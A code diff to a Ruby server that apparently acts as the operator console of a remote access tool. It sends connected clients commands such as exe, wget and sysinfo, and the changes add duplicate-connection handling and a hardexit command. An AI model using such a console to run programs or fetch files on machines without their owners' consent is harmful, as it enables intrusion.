@@ -21,16 +21,32 @@ class Server
 
   def run
     loop do
-      connection = @server.accept
-      puts "\nNew Connection: #{connection.peeraddr[3]}".green
-      client_id = client_count + 1
-      client = ClientConnection.new(
-        connection,
-        connection.peeraddr[3],
-        client_id
-      )
-      @clients[client_id] = client
-      @client_count += 1
+      begin
+        connection = @server.accept
+        puts "\nNew Connection: #{connection.peeraddr[3]}".green
+        duplicate_connection = false
+
+        @clients.each do |temp_client|
+          if connection == temp_client
+            duplicate_connection = true
+            puts "Attempted Duplicate Connection".red
+          end
+        end
+
+        unless duplicate_connection
+          client_id = client_count + 1
+          client = ClientConnection.new(
+            connection,
+            connection.peeraddr[3],
+            client_id
+          )
+          @clients[client_id] = client
+          @client_count += 1
+        end
+      rescue Exception => e
+        puts e.message.red
+        puts e.backtrace.join("\n").red
+      end
     end
   end
 
@@ -116,11 +132,11 @@ end
 
 def start
   client_cmds = %w[
-    ls exe sysinfo getpwd getpid wget ifconfig
+    ls exe sysinfo pwd pid wget ifconfig
   ]
 
   general_cmds = %w[
-    select clients help history clear quit exit
+    select clients help history clear quit exit hardexit
   ]
 
   port = 3000
@@ -168,14 +184,14 @@ def start
     when 'sysinfo'
       server.send_client('sysinfo', server.current_client)
       data = server.recv_client(server.current_client)
-    when 'getpid'
-      server.send_client('getpid', server.current_client)
+    when 'pid'
+      server.send_client('pid', server.current_client)
       data = server.recv_client(server.current_client)
     when 'ifconfig'
       server.send_client('ifconfig', server.current_client)
       data = server.recv_client(server.current_client)
-    when 'getpwd'
-      server.send_client('getpwd', server.current_client)
+    when 'pwd'
+      server.send_client('pwd', server.current_client)
       data = server.recv_client(server.current_client)
     when 'wget'
       server.send_client("wget #{action}", server.current_client)
@@ -192,6 +208,9 @@ def start
       next
     when 'exit'
       server.quit
+      next
+    when 'hardexit'
+      server.hardexit
       next
     else
       puts "Unknown command: #{input}. Enter 'help' for availabe commands.".red
